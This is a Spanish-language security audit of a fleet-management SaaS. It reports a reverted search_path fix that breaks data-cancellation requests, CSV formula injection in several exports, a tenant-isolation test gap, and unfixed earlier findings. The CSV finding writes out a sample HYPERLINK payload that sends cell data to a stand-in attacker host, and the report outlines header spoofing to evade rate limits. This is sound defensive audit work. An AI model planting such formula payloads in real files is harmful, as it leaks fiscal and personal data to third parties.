# Seguridad — auditoría 23

**Nota: 6/10** (antes 7). Razón del movimiento: **deuda que cobró factura**. La
22 dejó escrito, con todas sus letras, que «un arreglo que reescribe una función
existente en vez de partir de su cuerpo es el patrón de falla del día» — y ese
patrón se consumó **en la misma migración que lo dijo**: la 0273 partió del
cuerpo de la **0262**, no del de la **0264**, y al hacerlo revirtió en silencio
el `set search_path` que la 0264 existía para arreglar. `ejecutar_arco_cancelacion`
vuelve a tronar en producción y **CI no lo puede ver** (pgcrypto vive en
esquemas distintos en local y en Supabase gestionado). Segundo motivo del punto:
**cero de los cinco hallazgos de la 22 se cerró** — los cinco siguen abiertos,
verificados uno por uno abajo. Un rubro que no se atacó y que además regresó un
arreglo verificado en vivo no sostiene el 7.

No baja de 6 porque el ancla de ≤4 sigue sin cumplirse: **no encontré ningún
camino de acceso sin autenticar a datos de un tenant**. Las 64 rutas de `/api`
siguen teniendo puerta propia (las revisé de nuevo, con un barrido distinto al
de la 22), no hay secreto con fallback derivado, y el andamio de CI **sí**
modela los GRANT implícitos de Supabase — el hueco más grande que la 22 declaró
no revisado resultó estar cubierto.

**El riesgo mayor de hoy:** el derecho de cancelación ARCO es hoy **inejecutable
en producción** y la única prueba que lo cubre es verde. El primer operador que
lo ejerza recibe un error crudo de Postgres en lugar de la anonimización que el
panel promete por escrito.

## Hallazgos

### [ALTO] La 0273 revirtió el `search_path` que la 0264 arregló: `ejecutar_arco_cancelacion` vuelve a tronar en producción, y CI no lo ve
`supabase/migrations/0273_arco_cancelacion_texto_libre.sql:41`
(comparar con `supabase/migrations/0264_arco_cancelacion_digest_calificado.sql:59`)

Escenario, con valores. La 0264 (28-ago) encontró —verificándolo **en vivo
contra producción**, no en CI— que la función traía `set search_path = public,
pg_catalog` desde la 0173, que `digest()` la aporta `pgcrypto`, y que en Supabase
gestionado `pgcrypto` vive en el esquema **`extensions`**. Sin `extensions` en el
`search_path`, la llamada sin calificar falla SIEMPRE con
`ERROR: 42883: function digest(text, unknown) does not exist`. La 0264 lo cerró
extendiendo el `search_path` a `public, extensions, pg_catalog` (:59) y lo dejó
documentado en `migraciones_verificadas.test.ts:57`, con la nota de que se
verificó la llamada real contra producción antes y después.

La 0273 (30-ago, cierre de LEG-A4 de la 22) volvió a hacer
`create or replace function public.ejecutar_arco_cancelacion(...)` y en su :41
escribió **`set search_path = public, pg_catalog`**. Su propio comentario
(:20-24) declara el origen del error: «ESTA MIGRACIÓN PARTE DEL CUERPO DE LA
0262, VERBATIM». La 0262 es la versión **anterior** a la 0264. Al copiar el
cuerpo bueno se copió también la cabecera mala, y `extensions` desapareció.
Verifiqué que la 0273 es la última definición de la función: no hay ningún
`create or replace` ni `alter function ... set` posterior
(`grep -rn "ejecutar_arco_cancelacion" supabase/migrations/` → solo 0173, 0178,
0262, 0264, 0273).

Entra esto: el contralor de Transportes del Norte abre `/dashboard/arco`, ve la
solicitud de cancelación de Juan Pérez y aprieta **«Ejecutar cancelación»**
(`src/app/dashboard/arco/page.tsx:216`). Sale esto mal: `repo.ts:1586` llama la
RPC, Postgres lanza `42883` en la línea del seudónimo (0273:75, antes de tocar
una sola tabla), `repo.ts:1590` convierte el error en un `throw`, y
`page.tsx:93` pinta `mensajeParaPantalla(e, 'ejecutar la cancelación')`. **Nada
se anonimiza**: `operador.nombre`, `.telefono`, `.rfc`, `.licencia` y el texto
libre de `incidencia.descripcion` que la propia 0273 vino a retirar siguen tal
cual, y la solicitud sigue `recibida` mientras corre el plazo de 20 días
hábiles del art. 31.

Por qué es una **falla silenciosa** y no un bug ruidoso cualquiera: el bloque
210 de `supabase/verificaciones.sql:8195` llama `ejecutar_arco_cancelacion` de
verdad y espera `ok=t`, y **pasa en verde** — porque corre sobre el Postgres
local de CI, donde `andamio_ci.sql` deja que la 0001 instale `pgcrypto` en
`public` (`andamio_ci.sql:14-19`, y `create schema if not exists extensions` en
:121 crea el esquema vacío). `digest()` sin calificar resuelve por `public` en
local. La 0264 ya había escrito esto textualmente como «el bloque pasaba en
verde en CI mientras la función fallaba en producción», y hoy vuelve a ser
cierto. El bloque **E** de `capa1_auditoria_estatica.sql:204-219` tampoco lo ve:
solo comprueba que exista *algún* `search_path=` en `proconfig`, nunca su
contenido.

Consecuencia: el titular de los datos (un operador) no puede ejercer su derecho
de cancelación, y la flota —responsable ante la autoridad— no tiene forma de
cumplir aunque quiera. Como el defecto está en el `search_path` de la función y
no en la app, no hay reintento ni camino alterno: falla igual cada vez.

Causa raíz probable: reconstruir una función por copia del cuerpo de una versión
vieja copia también su cabecera, y ninguna comprobación del repo mira *qué dice*
el `search_path`, solo que exista.

### [MEDIO] La descripción de un CFDI que manda un proveedor por correo entra sin neutralizar a los CSV que el contador abre en Excel
`src/lib/likida/export.ts:38-41` (`csvCell`) · `src/lib/likida/contabilidad/formatos.ts:19-24` (`celda`) ·
`src/lib/likida/proveedores.ts:65-74` (`leerDescripcionPrimerConcepto`) y `:141` · `src/lib/likida/proveedores.ts:361`

Escenario, con valores. Un proveedor —un tercero **fuera del tenant**, que solo
necesita conocer el buzón de la flota, que es justo el dato que se le comparte
para que facture— manda por correo un CFDI válido cuyo primer concepto lleva
`Descripcion="=HYPERLINK(\"https://ev.il/?d=\"&amp;A2,\"Ver factura\")"`.
`api/correo/entrante/route.ts` verifica la firma de Resend, resuelve el tenant
por el DESTINATARIO (las dos cosas están bien hechas) y llama
`guardarFacturaProveedor` (:386). Ahí `proveedores.ts:141` guarda
`descripcion = leerDescripcionPrimerConcepto(xmlCrudo)`: la regex de :66 saca el
atributo tal cual, decodifica las cinco entidades XML y corta a 200 caracteres —
**no toca `=`, `+`, `-`, `@` ni el tabulador**.

El contralor aprueba la factura en la bandeja y descarga
`GET /api/export/facturas-proveedor`. La ruta llama `exportarAprobadas` →
`aFilaExportProveedor` (`proveedores.ts:361`: `descripcion: f.descripcion ?? ''`)
→ `toCsv` → `csvCell` (`export.ts:38-41`), cuyo escape es
`/[",\n]/.test(s) ? '"'+s.replace(/"/g,'""')+'"' : s`. Una celda que empieza con
`=` **no casa ninguna de las tres condiciones**, así que sale literal. El
contador abre `facturas_proveedor.csv` en Excel o lo importa a CONTPAQi y la
celda se evalúa como fórmula: `HYPERLINK` arma un enlace con el contenido de la
celda vecina (el UUID fiscal, el RFC), `WEBSERVICE`/`DDE` en las
configuraciones que aún lo permiten hacen la petición sin clic.

El mismo hueco, misma causa, en cuatro exports más: `export/liquidaciones`
(`folio_viaje` y `operador` son las **dos primeras columnas**, `export.ts:66-67`),
`export/poliza` (`formatos.ts:19-24`, misma forma de escape),
`export/bitacora-peaje` (`desglose_peaje.ts:1068`: `caseta` y `tag` salen del
xlsx del operador de casetas) y `export/jornada`.

Refutación que intenté y no prosperó: busqué un saneador aguas arriba
(`intake/sanitizar.ts` recorta y quita delimitadores, pero solo se aplica a lo
que va al contexto del agente — en `correo/entrante/route.ts` se usa únicamente
sobre `adj.filename`, líneas 348 y 355, nunca sobre la descripción). Tampoco hay
CHECK en la base ni filtro en la pantalla de la bandeja. Lo que **sí** acota la
severidad y por eso es MEDIO y no ALTO: Excel moderno bloquea DDE por default y
pide confirmación al abrir un CSV con fórmulas, y la ruta de export exige sesión
con rol (`resolverTenantApi` + `puedeExportar`), así que la víctima es siempre
alguien de la propia flota.

Consecuencia: el contador de la flota —el comprador del producto— ejecuta
contenido escrito por un tercero al abrir un archivo que Likida le entregó como
contabilidad. Y el archivo que va a su ERP lleva el mismo texto.

Causa raíz probable: los dos escapes de CSV se escribieron contra el problema de
*parseo* (separador, comilla, salto de línea) y no contra el de *evaluación*, que
es de la hoja de cálculo y no del formato.

### [BAJO] `factura_viaje` quedó fuera del guardián de aislamiento por tener su `tenant_id` en un `add column`, y el propio guardián afirma que ese caso no existe
`supabase/pruebas-aislamiento/consultas_admin_filtran_tenant.test.ts:69-72` ·
`supabase/migrations/0145_fks_con_tenant_barrido_completo.sql:100`

Escenario, con valores. `tablasConTenantId()` deriva la lista de tablas
vigiladas parseando **únicamente el cuerpo del `create table`**, y su comentario
justifica el atajo así, textual: «no hay un solo `add column tenant_id`
posterior a la creación — confirmado por grep». Esa afirmación es falsa desde la
0145: `factura_viaje` nace sin `tenant_id` en `0049:83-87` y lo gana en
`0145:100` (`add column if not exists tenant_id ... references public.tenant(id)`,
NOT NULL en :125). Reproduje la función del test sobre el directorio real:
**92 tablas vigiladas, `factura_viaje` NO está entre ellas.**

Consecuencia hoy: ninguna. Abrí los seis `.from('factura_viaje')` de producción
(`relojes_legales.ts:281`, `libro_viaje.ts:608` y `:657`,
`facturacion_escritura.ts:425`, `auditor_cobranza.ts:600` y `:642`) y los seis
anclan por `viaje_id`/`factura_id` que ya vienen filtrados, con el filtro de
flota aplicado río abajo sobre `factura_emitida`. Consecuencia mañana: el día que
alguien escriba una séptima consulta sobre esa tabla sin `.eq('tenant_id', …)`,
la prueba que existe exactamente para atrapar ese olvido pasará en verde —
`factura_viaje` liga una factura con un viaje, así que un filtro olvidado ahí
cruza flotas. Detalle que empeora el efecto: tres de esos seis sitios llevan un
comentario que dice «`factura_viaje` NO tiene `tenant_id`»
(`auditor_cobranza.ts:595`, `libro_viaje.ts:604`), o sea que quien mantenga esto
lee una afirmación falsa justo donde tendría que decidir.

Causa raíz probable: la lista de tablas protegidas se deriva de un subconjunto
de la sintaxis DDL, y una migración usó la sintaxis que ese subconjunto no
cubre.

### [MEDIO · REINCIDENTE de la 22] La CSP sigue bloqueando la subida y la reproducción del banco de videos
`src/proxy.ts:79` (`connect-src 'self'`, sin `media-src` en :72-84) ·
`src/app/admin/marketing/subir-hook.tsx:46` · `src/app/admin/marketing/page.tsx:165`

Verificado sin cambios: la CSP de `proxy.ts:72-84` sigue con `connect-src 'self'`
y sin `media-src`, `subir-hook.tsx:46` sigue llamando `subirConUrlFirmada`
(`browser-storage.ts:38`) contra `https://<ref>.supabase.co`, y `page.tsx:165`
sigue pintando `<video src={h.videoUrl}>` con la URL firmada de `estudio.ts`.
El escenario completo está en `docs/auditoria-22/seguridad.md`; no lo repito. Lo
único nuevo que aporto: sigue siendo el hallazgo cuya reparación apurada
(`connect-src https://*.supabase.co`) abriría al navegador el origen de
PostgREST con la anon key ya presente en el bundle.

### [MEDIO · REINCIDENTE de la 22] Dos resolvedores de `?tenant=` siguen sin mirar `error`
`src/lib/auth/tenant-efectivo.ts:179` · `src/app/api/dashboard/chat/tenant.ts:23-26`

Verificado sin cambios: `tenant-efectivo.ts:179` sigue siendo
`const { data: t } = await supabaseAdmin().from('tenant')...maybeSingle()` con
`if (t)` como única guarda, y `chat/tenant.ts:23-26` igual. Sus hermanas de
`lib/auth/tenant-api.ts` (`resolverTenantApi:64-67` devuelve 503,
`resolverTenantPedido:93-98` lanza) siguen haciéndolo bien. Escenario completo
en la nota de la 22.

### [MEDIO · REINCIDENTE de la 22] El correo sigue fuera del catálogo de `redactarTexto` y una llave de rate-limit lo escribe en el log
`src/lib/logger.ts:49-64` · `src/lib/ratelimit.ts:204` y `:210` · `src/app/api/lead/route.ts:187-188`

Verificado sin cambios: las cinco reglas de `logger.ts:49-64` siguen siendo UUID,
RFC, teléfono (`PHONE`), CLABE y TARJETA — ninguna cubre un correo — y
`ratelimit.ts` sigue emitiendo `{ key, ... }` en `ratelimit.redis_fallo` desde
los dos sitios. Sigue sin llegar a Sentry (la lista blanca de
`observability/sentry.ts` no incluye `key` ni `err`), así que la severidad no
cambia.

### [BAJO · REINCIDENTE de la 22] Los tres server actions de ARCO siguen sin revalidar el rol
`src/app/dashboard/arco/page.tsx:46`, `:76`, `:108`

Verificado sin cambios: las tres siguen haciendo `await requireSessionTenant(RUTA)`
a secas, sin el `puedeVerRuta(s.rol, RUTA)` que sí meten
`combustible-casetas/page.tsx:56-60`, `emergencias/page.tsx:78-79` y
`jornada/page.tsx:49-51`. Sigue siendo un insider del mismo tenant, no un
extraño (Next 16.3.2 verifica `Origin` contra `Host` en cada Server Action).

### [BAJO · REINCIDENTE de la 22] `search` de MCP sigue sin neutralizar la coma antes de `.or()`
`src/lib/mcp/herramientas/viajes.ts:103` y `:111`

Verificado sin cambios: `:103` sigue siendo `.replace(/[%_\\]/g, m => '\\'+m)` —
sin coma ni paréntesis— y `:111` sigue interpolando ese patrón dentro de
`.or(...)`. El `.eq('tenant_id', tenantId)` de :110 sigue AND'eado por fuera, así
que sigue sin haber salida del tenant. Su hermana bien hecha es
`sat_descarga/bandeja.ts:484-485` (`t.replace(/[%,()]/g, ' ')`).

## Lo que revisé y está bien

- **El hueco más grande que la 22 declaró no revisado, resultó cubierto.** Los
  GRANT implícitos de Supabase **sí** están modelados en CI:
  `supabase/pruebas-aislamiento/andamio_ci.sql:92-96` aplica
  `alter default privileges in schema public grant select, insert, update,
  delete on tables to anon, authenticated, service_role` **antes** de correr las
  migraciones, con la razón escrita («sin este bloque, TODA tabla le devolvería
  permission denied … y la batería completa pasaría en verde sin que RLS hiciera
  ni un solo filtro»). O sea que los ~88 ataques dinámicos de
  `verificaciones.sql` atacan con los mismos permisos de tabla que en producción,
  y RLS es lo único que los detiene. El bloque de funciones se omite **a
  propósito y con razón correcta**: Postgres ya concede EXECUTE a PUBLIC por
  default, que es el mecanismo del que dependen los REVOKE explícitos de las
  0012/0031/0054/0062.
- **Las 64 rutas de `/api`, con un barrido distinto al de la 22.** Grepeé cada
  `route.ts` por la ausencia de *cualquier* verbo de guardia; salieron 15
  candidatas y las abrí todas. Las siete de `/api/dashboard/*` usan
  `getSessionTenant()` + `puedeVerArea` (`archivo:32-34`, `chat:16`,
  `conversaciones:14-16`, `conversaciones/[id]:15-17`, `evento:37`,
  `ingesta:49-51`, `onboarding-chat`), y las que escriben llevan además
  `vieneDeNuestroSitio` **antes** de resolver sesión (`archivo:27`,
  `evento:31`, `ingesta:44`). `webhooks/calcom/route.ts` es un re-export de una
  línea del handler firmado (`../../webhook/calcom/route`).
  `correo/baja/route.ts` verifica un HMAC en tiempo constante
  (`lib/correo/baja.ts:54-65`, `timingSafeEqual` con chequeo de largo previo) y
  **el GET no suprime nada** para que el prefetch de un escáner corporativo no
  dé de baja a nadie. `health`, `lead`, `demo`, `marketing/*` y
  `mcp/oauth/registro` son públicas a propósito y ninguna devuelve dato de un
  tenant. **No hay una sola ruta sin puerta.**
- **`/api/health` no expone nada nuevo pese a los +26 de la 22.** El estado
  `config_ausente` que se agregó es un enum de baja cardinalidad
  (`route.ts:87`, `:160`); los nombres de cron y sus edades quedan en
  `logger.error`/`logger.warn` (`:96`, `:116`, `:128`), nunca en el cuerpo. El
  cuerpo son cuatro campos: `ok`, `status`, `checks:{db,crons}`, `version` (el
  sha corto, público en GitHub) y `hora` (`:157-164`). Probé el abuso como
  amplificador de correo: `alertarOperador('cron.sin_latido', {codigo:
  'cron_sin_latido'})` produce siempre la misma huella en
  `huellaDeDetalle` (`alerta.ts:115-121`, `codigo` está en `SALIENTES`), así que
  el `SET NX PX` de una hora sobre Redis (`alerta.ts:66-87`) es un solo correo
  por hora por más pings que le peguen. Rate limit 30/min por IP en `:57`.
- **El `.or()` con cursor de `/v1` sí neutraliza lo que el de MCP no.**
  `api/v1/viajes/route.ts:124` y `export/liquidaciones/route.ts:113`
  interpolan `despues.creadoEn`/`despues.id`, que vienen de un cursor del
  cliente — pero `decodificarCursor` (`api/v1/_comun.ts:449-457`) exige
  `UUID.test(id)`, `!Number.isNaN(Date.parse(creadoEn))` **y**
  `!/["(),]/.test(creadoEn)`: sin coma, comilla ni paréntesis no se puede abrir
  una condición nueva en el mini-lenguaje de PostgREST. Es la prueba de que el
  repo sabe hacerlo, y por eso `mcp/herramientas/viajes.ts:103` es la excepción
  y no la norma.
- **El cofre de credenciales de conector.** `conectores/cofre.ts`: AES-256-GCM
  (cifrado autenticado, con la razón contra CBC escrita en :18-24), IV de 12
  bytes nuevo en cada guardado (:67), llave derivada de `LIKIDA_COFRE_LLAVE` con
  mínimo de 32 caracteres y **`throw` si falta** (:48-57, «el modo de falla
  aceptable es "no se puede guardar la credencial", no "se guardó donde
  cualquiera puede leerla"»), formato versionado `v1.<iv>.<tag>.<cifrado>` para
  poder rotar, y `pistasDe` que tapa entero cualquier secreto de menos de 8
  caracteres (:109). Cifrado en la app y no con pgcrypto a propósito
  (`0094:22`): un volcado de la base es ruido.
- **El portal de pago, que la 22 no alcanzó.** `portal_pago.ts:83`: 32 bytes de
  `randomBytes` en base64url; en la base solo su sha256 (`hashDeToken`, :91);
  `prefijoDeToken` (:104-112) rechaza todo lo que no sea `pgo_` + base64url, así
  que una ráfaga contra `/pago/loquesea` no llega ni a consultar; `resolverLiga`
  (`portal_pago_lectura.ts:141-188`) recorre **todas** las candidatas del
  prefijo aunque la primera cuadre y compara con `mismoHash`
  (`auth/llave-api.ts:110`, `timingSafeEqual`); `estadoLiga` falla **cerrado**
  ante una fecha ilegible (`portal_pago.ts:145`); vigencia acotada a 1-365 días
  con default de 90 y valores fuera de rango cayendo al default
  (`diasDeVigencia`, :118-123); y el texto de rechazo es **el mismo** para «no
  existe», «caducó», «revocado» y «basura» (`TEXTO_LIGA_NO_VALIDA`, :157) para
  que probar tokens no enseñe nada. El alcance es UNA factura y lo que se puede
  hacer del otro lado es *proponer* un pago, nunca saldar (:20-26).
- **MFA y step-up.** `auth/mfa.ts:52` separa «¿tiene factor?» de «¿pude
  preguntarlo?» (`legible`), y `exigirAal2SiHayFactor:79` rechaza con
  `no_verificable` cuando Supabase Auth no contesta — falla **cerrado**, que es
  lo contrario del bug B14 que el propio comentario documenta (:46-51). Su
  único consumidor es `api/admin/copiloto/route.ts:162`; eso es una política
  incremental declarada, no un descuido.
- **La liga de baja de campaña.** HMAC-SHA256 del correo normalizado con
  `LIKIDA_BAJA_SECRET` (`correo/baja.ts:47-49`), `null` si no hay secreto —y
  `cola.ts` **no manda la campaña** sin liga—, comparación en tiempo constante.
  Cero fallback derivado.
- **Secretos.** Repetí el barrido con otra forma
  (`process\.env\.[A-Z_]+\s*\|\|\s*process\.env\.[A-Z_]+`) sobre todo `src/`:
  el único resultado real es `sat_descarga/index.ts:100`
  (`LIKIDA_SAT_PASSWORD || LIKIDA_PAC_PASSWORD`), que la 22 ya descartó por ser
  la misma cuenta de SW y estar declarado en pantalla. `env.ts` no tiene ni uno.
  Los otros tres resultados son `VERCEL_ENV || NODE_ENV`, que no es un secreto.
- **La cadena de OAuth de MCP.** `mcp/oauth.ts`: PKCE S256 obligatorio con
  verifier acotado a 43-128 caracteres (`canjearCodigo:341-346`); código de un
  solo uso marcado con la condición **en la base**
  (`.is('usado_en', null)`, :350-357) y reuso ⇒ **revocación de la familia
  entera** (:333-336, RFC 6749 §4.1.2); refresco con rotación y detección de
  reuso (:398-401); `validarAcceso:489` revalida la identidad congelada del
  token contra `app_user` **en la misma consulta**, anclada por columna, así que
  un usuario que cambia de flota o de rol deja de servir en el acto y no en el
  siguiente refresco. TTLs cortos y declarados: código 5 min, acceso 8 h,
  refresco 60 días (:36-41).
- **Los TTL de URL firmada, revisados uno por uno.** 60 s el PDF de liquidación
  (`export/pdf/[id]/route.ts:101`, `processor.ts:3782` y `:3864`) y las fotos de
  QA (`admin/qa-storage.ts:418`, `:449`); 300 s el informe por WhatsApp
  (`oficina_wa.ts:136`); 3600 s los insumos de agente (`agentes/insumos.ts:269`,
  `:284`) y el banco de hooks (`admin/bus.ts:169`) — los dos son consumo interno
  de Javier. `intake/almacen.ts:154` documenta 3600 s «igual que los PDF», que ya
  no es cierto (los PDF son 60 s), pero la función **no tiene un solo llamador de
  producción**: es código muerto, no un TTL vivo mal puesto.
- **`/aviso/[tenant]`, la página pública con un id de tenant en la URL.**
  `page.tsx:62` exige forma de UUID antes de consultar y `:72` responde
  `notFound()` sin distinguir «no existe» de «está a medias»; lo que devuelve son
  los datos del responsable que la propia ley obliga a publicar.
- **CVE — descartados por escrito.** `npm audit` reporta **0 vulnerabilidades**
  sobre 759 dependencias, y eso es insumo, no veredicto, por dos razones que
  verifiqué: (1) `xlsx` entra como `file:vendor/xlsx-0.20.3.tgz`
  (`package.json`), o sea que **`npm audit` es estructuralmente ciego a él** —
  lo revisé a mano: 0.20.3 es posterior a los dos CVE conocidos de SheetJS
  (CVE-2023-30533, prototype pollution, corregido en 0.19.3; CVE-2024-22363,
  ReDoS, corregido en 0.20.2), y sus dos usos de producción
  (`dashboard/viajes/page.tsx:2` y `intake/desglose_peaje.ts:35`) reciben
  archivos de un usuario **ya autenticado y con rol**, con tope de 8 MB
  (`MAX_IMPORT_BYTES`); (2) busqué un sink de parseo alcanzable desde entrada no
  confiable y no encontré ninguno nuevo: `fast-xml-parser` sigue detrás del HMAC
  de Resend con tope de 4 MB (`correo/entrante/route.ts:75`), `pdf-parse` solo
  aparece en una prueba (`liquidacion/pdf.test.ts:61`), y `sharp`/`zxing-wasm`
  siguen detrás del HMAC de Meta. **No levanto ningún CVE con camino real de
  explotación en esta app.**

## Lo que NO alcancé a revisar

- **`clientIp` y la confianza en `x-forwarded-for`.** `src/lib/ratelimit.ts:278`
  toma el **primer** valor de `x-forwarded-for` (y `login/page.tsx:80`,
  `reenvio_enlace.ts:91`, `pago/[token]/page.tsx:84` repiten el patrón). Si el
  borde de Vercel *añade* la IP real a un `x-forwarded-for` que el cliente
  mandó, en vez de reemplazarlo, ese primer valor es del atacante y **todos** los
  límites por IP de la app se esquivan rotando una cabecera — incluidos los que
  son la única defensa de fuerza bruta de `/api/mcp/oauth/token`,
  `/api/lead` y el reenvío de magic link. No lo reporto como hallazgo porque
  **no pude verificarlo**: depende del comportamiento del borde de Vercel, no
  del código, y confirmarlo exige una petición real contra el despliegue con
  `x-forwarded-for: 1.2.3.4` y mirar qué llega. Es la comprobación de mayor
  valor por minuto que le queda a este rubro.
- **La 0273 contra una base gestionada de verdad.** El hallazgo 1 lo sostengo
  sobre la evidencia que el propio repo dejó escrita (la 0264 dice haberlo
  verificado en vivo contra producción, dos veces, con `select nspname from
  pg_proc`) y sobre la lectura de las tres migraciones. No corrí la RPC contra
  un Supabase gestionado — no tengo credenciales aquí. Un `select prosrc,
  proconfig from pg_proc where proname='ejecutar_arco_cancelacion'` contra
  producción lo confirma o lo tumba en un minuto.
- **`supabase/verificaciones.sql` entero** (15,000+ líneas, ~112 bloques). Leí
  el 210 y el 221 para el hallazgo 1 y crucé títulos con
  `migraciones_verificadas.test.ts`, pero no lo corrí ni lo leí completo. Un
  `\dp` contra el esquema vivo sigue siendo la única forma de comprobar los
  GRANT efectivos; lo que sí puedo afirmar hoy, y la 22 no, es que el **andamio**
  los modela.
- **La otra mitad del bloque B de `capa1_auditoria_estatica.sql`.** Ese bloque
  (:102-118) busca funciones `SECURITY DEFINER` ejecutables por **`anon`**, no
  por `authenticated`. Como en Postgres el default es EXECUTE a PUBLIC y `anon`
  hereda de PUBLIC, cubre el caso del olvido total; lo que **no** cubre es una
  función que alguien conceda explícitamente solo a `authenticated`. Revisé los
  grants explícitos de las migraciones (`grep "grant execute" | grep
  "authenticated"`) y las cuatro que existen son ayudantes de RLS
  (`is_superadmin`, `get_user_tenant_ids`, `administra_flota`, `ve_finanzas`,
  migs. 0054 y 0126), que tienen que serlo. No lo convierto en hallazgo porque
  hoy no hay ninguna función mal concedida; lo dejo anotado como el borde que la
  comprobación no vigila.
- **Los conectores GPS/ERP más allá del cofre.** Leí `cofre.ts` completo; no
  revisé `credenciales.ts`, `registro.ts` ni `eventos_seguridad.ts`, ni quién
  puede leer `conector_credencial` desde el panel.
- **Verificación en runtime, otra vez.** Todo esto es lectura de código y de
  SQL. No levanté la app ni pegué una sola petición: ni la CSP del reincidente 1,
  ni el CSV del hallazgo 2 abierto en un Excel real, ni el `x-forwarded-for` de
  arriba.
